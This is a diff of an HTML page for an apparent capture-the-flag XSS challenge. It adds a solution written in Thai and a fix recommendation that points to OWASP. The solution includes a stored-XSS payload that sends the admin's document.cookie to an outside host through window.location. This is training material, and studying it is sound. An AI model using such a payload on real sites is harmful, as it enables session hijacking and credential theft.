@@ -19,7 +19,7 @@
             <div class="content-banner">
                 <div class="header-score">
                     <div>
-                        <h1>Cross Site Scripting (XSS)&nbsp;<span>(15 points)</span></h1>
+                        <h1>Cross Site Scripting (XSS)&nbsp;<span>(200 points)</span></h1>
                         <h4>Login with Javascript</h4>
                     </div>
                 </div>
@@ -54,8 +54,8 @@
                     <div>
                         <h5>Related ressource(s)</h5>
                         <ul class="resource"> 
-                            <li><a href="#">HTTP Header</a></li>
-                            <li><a href="#">HTTP reqeust response</a></li>
+                            <li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">Cross-site Scripting (XSS)</a></li>
+                            <li><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">Testing for Stored Cross site scripting</a></li>
                         </ul>
                     </div>
                     <div>
@@ -75,23 +75,24 @@
                                     </button>
                                     <!-- Modal -->
                                     <div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
-                                    <div class="modal-dialog" role="document">
-                                        <div class="modal-content">
-                                        <div class="modal-header">
-                                            <h5 class="modal-title" id="exampleModalLongTitle">Solution</h5>
-                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                                            <span aria-hidden="true">&times;</span>
-                                            </button>
+                                        <div class="modal-dialog" role="document">
+                                            <div class="modal-content">
+                                                <div class="modal-body m-3 pb-0">
+                                                    <h5 class="mb-2">Solution</h5>
+                                                    - เป้าหมายของข้อนี้คือการขโมย Cookie ของ admin ให้ได้ ซึ่งหน้าเว็บมีฟังก์ชันสามารถโพสข้อความได้ ซึี่งสามารถโพสอะไรก็ได้ใน format HTML ไม่ว่าจะเป็น image, paragraph, header หรือแม้กระทั่ง script (JS) !! ทำให้มีช่องโหว่ Stored XSS โดยการที่จะขโมย Cookie ของ admin ได้นั้นทำได้หลากหลายท่า เราจะเฉลยหนึ่งในนั้น คือการให้ admin redirect ไปที่เว็บที่เราต้องการพร้อมกับ Cookie ของเขา Payload ดังนี้<br><br>
+                                                    &lt;script&gt;<br>
+                                                    <div class="ml-4 mb-0">window.location = &quot;http://www.mysite.com/&quot; + document.cookie;</div>
+                                                    &lt;/script&gt;<br><br>
+                                                    รอสักครู่แล้วไปดู log flag ซึ่งอยู่ใน Cookie ก็จะติดมากับ request นั้นๆ เป็นอันจบ เย่
+                                                    <h5 class="mt-3 mb-2">Recommendation</h5>
+                                                    - วิธีแก้ XSS ก็คือ ทำการ Escape special character ทุก ๆ ครั้งที่มีการแสดง หรือสามารถ Escape character ตั้งแต่กระบวนการ insert ข้อมูลลงใน database ก็ทำได้เช่นเดียวกัน<br>
+                                                    ref : <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet</a> 
+                                                </div>
+                                                <div class="modal-footer mt-0 pt-2 px-4">
+                                                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                                                </div>
+                                            </div>
                                         </div>
-                                        <div class="modal-body">
-                                            //Solution Here
-                                        
-                                        </div>
-                                        <div class="modal-footer">
-                                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-                                        </div>
-                                        </div>
-                                    </div>
                                     </div>
                                 </div>    
                             </li>
